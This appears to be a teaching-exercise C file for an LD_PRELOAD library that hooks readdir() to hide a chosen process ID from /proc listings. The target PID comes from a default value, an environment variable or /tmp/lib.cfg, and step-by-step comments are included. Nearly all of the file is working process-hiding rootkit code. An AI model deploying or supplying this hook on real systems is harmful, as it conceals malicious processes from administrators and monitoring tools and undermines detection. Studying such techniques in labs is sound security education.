// The _GNU_SOURCE feature test macro must be defined in order to obtain 
// the  definitions  of  RTLD_DEFAULT and RTLD_NEXT from <dlfcn.h>.
#define  _GNU_SOURCE

#include <stdio.h>
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>

// 1.- Define a static global function pointer on your lib (initially set to null) of a 
// orig_readdir function with the same signature as readdir. Use man to discover
// the signature
static struct dirent *(*orig_readdir) (DIR *) = NULL;
static char *pid= "174618";
static char file_pid[32];

int is_proc(DIR *dirp) {
  struct stat a, b; 
  fstat(dirfd(dirp), &a); 
  stat("/proc", &b); 
  return a.st_ino == b.st_ino; 
}


// 2.- When the library is loaded, we should initialize the orig_readdir
// function pointer to the original readdir function
__attribute__ ((constructor)) void initialization()
{
      orig_readdir = dlsym (RTLD_NEXT, "readdir");
      
      char *env_pid = getenv("PID");

      if(env_pid != NULL){
        pid = env_pid;
      }


      FILE *file = fopen("/tmp/lib.cfg", "r");

      if (file != NULL) {

          if (fgets(file_pid, sizeof(file_pid), file) != NULL) {

              file_pid[strcspn(file_pid, "\r\n")] = '\0';

              if (file_pid[0] != '\0') {
                  pid = file_pid;
              }
          }

          fclose(file);
      }

      fprintf (stderr, "Catched! %p\n\n", orig_readdir);
}

// 3.- Define a readdir function following the original specification
struct dirent *readdir (DIR * dirp)
{

// 4.- Now the easy part, invoke the orig_readdir function as it was legitimate
  struct dirent *tmp;
  tmp = orig_readdir (dirp);

  if(tmp != NULL && pid != NULL && is_proc(dirp) && strcmp(tmp->d_name, pid) == 0) {
    fprintf (stderr, "Catched! %s\n", tmp->d_name);
    tmp = orig_readdir(dirp);
  }

// 5.- Check the given process name, if the process name is the process we want to hide, just
// iterate again to the next dir entry and return it effectively skipping the hidden process
//
// TO DO !!!!
//
  
  return (tmp);
}